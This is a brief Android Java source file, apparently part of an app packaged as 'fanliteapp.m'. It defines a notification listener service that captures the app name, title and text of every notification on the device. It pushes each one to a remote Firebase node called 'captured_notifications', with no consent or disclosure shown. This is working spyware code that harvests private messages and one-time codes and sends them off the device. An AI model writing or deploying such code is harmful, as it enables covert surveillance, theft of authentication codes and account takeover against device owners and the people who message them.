package fanliteapp.m;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import com.google.firebase.database.FirebaseDatabase;
import java.util.HashMap;

public class NotifService extends NotificationListenerService {

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        // 1. Capture the data
        String pack = sbn.getPackageName();
        String title = sbn.getNotification().extras.getString("android.title");
        String text = sbn.getNotification().extras.getString("android.text");

        // 2. Push to Firebase
        HashMap<String, Object> map = new HashMap<>();
        map.put("app", pack);
        map.put("title", title);
        map.put("msg", text);
        map.put("time", System.currentTimeMillis());

        FirebaseDatabase.getInstance().getReference("captured_notifications").push().setValue(map);
    }
}
